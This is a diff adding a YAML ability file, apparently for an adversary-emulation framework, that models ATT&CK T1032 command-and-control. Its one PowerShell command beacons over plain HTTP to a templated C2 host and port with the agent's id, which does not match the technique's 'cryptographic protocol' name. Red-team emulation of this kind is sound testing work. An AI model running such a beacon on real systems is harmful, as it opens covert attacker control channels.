@@ -1,0 +1,14 @@
+- id: a2658418-4224-4eea-b004-e5649afdeac3
+  name: Standard Cryptographic Protocol
+  description: Ability for Standard Cryptographic Protocol (ATT&CK T1032). Generated
+    from Atomic Red Team procedures; review and test safely before use. [AUTO-INFERRED
+    SAFE STUB]
+  tactic: command-and-control
+  technique:
+    attack_id: T1032
+    name: Standard Cryptographic Protocol
+  platforms:
+    windows:
+      psh:
+        command: powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing
+          http://#{c2_host}:#{c2_port}/beacon?id=#{paw} -Method GET"
